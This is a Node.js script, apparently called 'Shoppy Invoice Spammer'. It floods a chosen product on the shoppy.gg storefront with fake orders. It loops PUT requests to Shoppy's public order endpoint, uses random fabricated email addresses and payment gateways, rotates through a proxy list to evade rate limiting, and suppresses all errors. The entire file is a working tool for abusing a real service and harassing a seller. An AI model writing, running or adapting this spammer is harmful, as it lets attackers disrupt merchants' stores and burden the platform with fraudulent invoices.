const request = require('request');
const chalk = require('chalk');
const fs = require('fs');
const proxies = fs.readFileSync('proxies.txt', 'utf-8').replace(/\r/gi, '').split('\n');
var email = ["yahoo.com", "yahoo.co.uk", "gmail.com", "gmail.us", "gmail.co.uk", "aol.com", "hotmail.com", "yandex.co"];
var gatewayt = ["PayPal", "BTC"];
var work = 0;
var fail = 0;
var prompt = require('prompt');
prompt.start();
console.log('Enter Product (RtZWSKx)');
console.log('Enter number of times to Spam');
prompt.get(['product', 'times'], function(err, result) {
    var product = result.product
    var times = result.times
    console.log('Spamming Shoppy Product "%s" "%s" times', product, times);
    process.on('uncaughtException', err => {});
    process.on('unhandledRejection', err => {});
    let i = 0,
        int = setInterval(() => {
            if (i++ >= times) return clearInterval(int);
            var proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var mail = email[Math.floor(Math.random() * email.length)];
            var gateway = gatewayt[Math.floor(Math.random() * gatewayt.length)];
            var random = Math.floor(Math.random() * 1000000);
            request.put('https://shoppy.gg/api/v1/public/order/store', {
                proxy: 'http://' + proxy,
                'timeout': 2500,
                json: true,
                gzip: true,
                headers: {
                    'origin': 'https://shoppy.gg',
                    'accept-language': 'en-US,en;q=0.9',
                    'accept-encoding': 'gzip, deflate, br',
                    'content-encoding': 'br',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
                    'content-type': 'application/json;charset=UTF-8',
                    'accept': 'application/json, text/plain, */*',
                    'vary': 'Accept-Encoding',
                },
                body: {
                    'email': random + '@' + mail,
                    'fields': [],
                    'gateway': gateway,
                    'product': product,
                    'quantity': '1'
                },
            }, (err, res, body) => {
                if (res && res.statusCode === 200) {
                    work++;
                    console.log(chalk.green('Sucess: Created a invoice %s@%s | %s | %s'), random, mail, gateway, proxy);
                } else {
                    fail++;
                    console.log(chalk.red('Error: failed to make a invoice %s@%s | %s | %s'), random, mail, gateway, proxy);
                }
                process.title = `[Shoppy Invoice Spammer] - ${product} | Worked ${work} | Failed ${fail} | Total Proxies ${proxies.length}`;
            });
        }, 0);
});